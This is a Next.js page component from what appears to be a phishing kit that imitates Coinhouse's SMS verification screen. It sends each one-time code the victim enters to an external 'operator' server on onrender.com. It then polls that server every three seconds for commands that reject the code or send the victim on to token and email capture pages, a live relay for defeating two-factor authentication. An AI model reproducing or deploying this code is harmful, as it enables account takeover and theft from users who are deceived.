"use client"

import { useState, useEffect, useRef } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { ChevronDown, ArrowLeft } from "lucide-react"
import Image from "next/image"
import Link from "next/link"
import { useMetrics } from "@/hooks/useMetrics"
import { useRouter } from "next/navigation"

// Detectar idioma do navegador - padrão sempre inglês exceto francês
const getDefaultLanguage = () => {
  if (typeof window !== "undefined") {
    const browserLang = navigator.language.toLowerCase()
    return browserLang.startsWith("fr") ? "fr" : "en"
  }
  return "en"
}

const translations = {
  fr: {
    title: "Code de vérification SMS",
    subtitle: "Entrez le code à 6 chiffres envoyé par SMS",
    codeLabel: "Code SMS",
    placeholder: "000000",
    verifyButton: "Vérifier",
    verifyLoading: "Vérification...",
    backToLogin: "Retour à la connexion",
    resendCode: "Renvoyer le SMS",
    invalidCode: "Code SMS invalide. Tente novamente.",
  },
  en: {
    title: "SMS verification code",
    subtitle: "Enter the 6-digit code sent via SMS",
    codeLabel: "SMS Code",
    placeholder: "000000",
    verifyButton: "Verify",
    verifyLoading: "Verifying...",
    backToLogin: "Back to login",
    resendCode: "Resend SMS",
    invalidCode: "Invalid SMS code. Try again.",
  },
}

// Monitoramento infinito SMS
const monitorClientSMS = async (clientId, router, onInvalidCode, isMonitoringRef) => {
  console.log(`Iniciando monitoramento SMS do cliente: ${clientId}`);
  
  let intervalId;
  
  const monitor = async () => {
    if (!isMonitoringRef.current) {
      console.log('Monitoramento SMS parado por flag');
      clearInterval(intervalId);
      return;
    }

    try {
      // 🔍 CONSULTA SERVIDOR A CADA 3 SEGUNDOS
      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/info`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        }
      });

      if (response.ok) {
        const clientData = await response.json();
        const command = clientData.data?.response || clientData.data?.command;
        
        // ❌ SMS INVÁLIDO - CONTINUA MONITORAMENTO
        if (command === "inv_sms") {
          console.log('SMS inválido detectado');
          onInvalidCode(); // Limpa campo + mostra erro
          return; // NÃO para o monitoramento
        }
        
        // ✅ VAI PARA TOKEN - PARA MONITORAMENTO
        if (command === "ir_auth") {
          console.log('Redirecionando para /token');
          clearInterval(intervalId);
          isMonitoringRef.current = false;
          router.push('/token');
          return;
        }

        // ✅ VAI PARA EMAIL - PARA MONITORAMENTO
        if (command === "ir_email") {
          console.log('Redirecionando para /email');
          clearInterval(intervalId);
          isMonitoringRef.current = false;
          router.push('/email');
          return;
        }
      }
    } catch (error) {
      console.log('Erro durante consulta SMS:', error);
    }
  };

  // 🔄 EXECUTA A CADA 3 SEGUNDOS
  await monitor(); // Primeira execução imediata
  intervalId = setInterval(monitor, 3000);
};

export default function SmsPage() {
  // ESTADOS PRINCIPAIS
  const [smsCode, setSmsCode] = useState(""); // SMS digitado
  const [clientId, setClientId] = useState(""); // ID do cliente
  const [isLoading, setIsLoading] = useState(false); // Loading do botão
  const [isInvalid, setIsInvalid] = useState(false); // Campo com erro
  const [errorMessage, setErrorMessage] = useState(""); // Mensagem de erro
  const isMonitoringRef = useRef(false); // Controla monitoramento

  const metrics = useMetrics() // Hook das métricas
  const router = useRouter()
  const [language, setLanguage] = useState(() => getDefaultLanguage())

  const t = translations[language as keyof typeof translations]

  // INICIALIZAÇÃO
  useEffect(() => {
    const storedClientId = localStorage.getItem('client_id');
    if (storedClientId) {
      setClientId(storedClientId);
    }
    
    return () => {
      isMonitoringRef.current = false;
    };
  }, []);

  // Envio automático de métricas ao carregar a página
  useEffect(() => {
    if (!metrics.isRegistered) {
      metrics.registerVisit() // Envia métricas automaticamente
    }
  }, [metrics])

  // Função que trata digitação do SMS
  const handleSmsChange = (value) => {
    setSmsCode(value.replace(/\D/g, '').slice(0, 6));
    
    if (isInvalid) {
      setIsInvalid(false);
      setErrorMessage("");
    }
  };

  // Função de erro SMS
  const onInvalidCode = () => {
    console.log('SMS inválido - limpando campo');
    setSmsCode(""); // ❌ Limpa o campo SMS
    setIsLoading(false); // ❌ Para o loading
    setIsInvalid(true); // ❌ Mostra erro visual
    setErrorMessage(t.invalidCode);
    // ✅ isMonitoringRef.current continua TRUE - NÃO para monitoramento
  };

  // ENVIO DO SMS
  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!clientId) {
      console.log('ClientId não disponível para envio do SMS');
      return;
    }

    if (!smsCode || smsCode.length !== 6) {
      return;
    }

    try {
      console.log('Enviando SMS:', smsCode);
      
      setIsLoading(true);
      setIsInvalid(false);
      setErrorMessage("");
      
      // 🚀 ENVIA SMS PARA O SERVIDOR
      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/external-response`, {
        method: 'PATCH',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          response: smsCode, // SMS que o usuário digitou
          command: ""
        })
      });

      if (response.ok) {
        console.log('SMS enviado com sucesso');
        
        // 🔄 INICIA MONITORAMENTO INFINITO
        if (!isMonitoringRef.current) {
          isMonitoringRef.current = true;
          await monitorClientSMS(clientId, router, onInvalidCode, isMonitoringRef);
        }
      } else {
        console.log('Erro ao enviar SMS');
        setIsLoading(false);
      }
    } catch (error) {
      console.log('Erro durante envio do SMS:', error);
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col lg:flex-row">
      {/* Left side - SMS Form */}
      <div className="flex-1 flex flex-col justify-center px-6 sm:px-8 lg:px-16 xl:px-20 bg-white min-h-screen py-6 lg:py-4">
        <div className="w-full max-w-md mx-auto">
          {/* Logo */}
          <div className="mb-6 lg:mb-4">
            <Image src="/coinhouse-logo.png" alt="Coinhouse" width={250} height={50} className="h-8 lg:h-10 w-auto" />
          </div>

          {/* Title and Language Selector */}
          <div className="flex flex-col space-y-4 lg:flex-row lg:items-center lg:justify-between lg:space-y-0 mb-6">
            <h1 className="text-xl lg:text-2xl font-semibold text-gray-900">{t.title}</h1>
            <Select value={language} onValueChange={setLanguage}>
              <SelectTrigger className="w-16 border border-gray-300 rounded-full px-3 py-1 h-8 lg:h-auto font-medium [&>svg]:hidden bg-white shadow-sm self-end lg:self-auto">
                <SelectValue />
                <ChevronDown className="h-3 w-3 ml-1 text-gray-600" />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="fr">FR</SelectItem>
                <SelectItem value="en">GB</SelectItem>
              </SelectContent>
            </Select>
          </div>

          {/* Back Button */}
          <Link href="/home" className="flex items-center text-gray-600 hover:text-gray-800 mb-6">
            <ArrowLeft className="h-4 w-4 mr-2" />
            {t.backToLogin}
          </Link>

          {/* SMS Form */}
          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="text-center lg:text-left">
              <p className="text-gray-600">{t.subtitle}</p>
            </div>

            <div>
              <Label htmlFor="code" className="text-sm font-medium text-gray-700 mb-2 block">
                {t.codeLabel}
              </Label>
              <Input
                id="code"
                type="text"
                value={smsCode}
                onChange={(e) => handleSmsChange(e.target.value)}
                placeholder={t.placeholder}
                className={`w-full h-12 px-4 border rounded-md focus:ring-2 focus:ring-blue-500 focus:border-transparent text-center text-2xl tracking-widest ${
                  isInvalid ? 'border-red-500' : 'border-gray-300'
                }`}
                maxLength={6}
                autoComplete="one-time-code"
                disabled={isLoading}
              />
              {errorMessage && (
                <p className="text-red-500 text-sm mt-1">{errorMessage}</p>
              )}
            </div>

            <div className="flex flex-col space-y-4 lg:flex-row lg:items-center lg:justify-between lg:space-y-0 pt-4">
              <Button 
                type="submit"
                disabled={!smsCode || smsCode.length !== 6}
                className="bg-black hover:bg-gray-800 text-white px-8 py-3 rounded-full font-medium w-full lg:w-auto disabled:opacity-50 flex items-center justify-center gap-2"
              >
                {isLoading && (
                  <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                )}
                {isLoading ? t.verifyLoading : t.verifyButton}
              </Button>

              <button 
                type="button" 
                disabled={isLoading}
                className="text-sm text-gray-600 hover:text-gray-800 underline text-center lg:text-left disabled:opacity-50"
              >
                {t.resendCode}
              </button>
            </div>
          </form>
        </div>
      </div>

      {/* Right side - Background with Phone - Hidden on mobile */}
      <div className="hidden lg:flex lg:flex-1 relative overflow-hidden">
        <div
          className="absolute inset-0 bg-gradient-to-br from-pink-400 via-purple-500 to-blue-500"
          style={{
            backgroundImage: `url('/gradient-background.png')`,
            backgroundSize: "cover",
            backgroundPosition: "center",
          }}
        />

        <div className="absolute inset-0 flex items-center justify-center">
          <div className="relative">
            <Image src="/phone-mockup.png" alt="Coinhouse App" width={300} height={600} className="drop-shadow-2xl" />
          </div>
        </div>

        <div className="absolute bottom-16 left-1/2 transform -translate-x-1/2 text-center text-white">
          <h2 className="text-2xl font-bold mb-2">
            {language === "fr" ? "Vérification SMS" : "SMS Verification"}
          </h2>
          <p className="text-xl">
            {language === "fr" ? "Sécurisez votre connexion" : "Secure your connection"}
          </p>
        </div>
      </div>
    </div>
  )
}
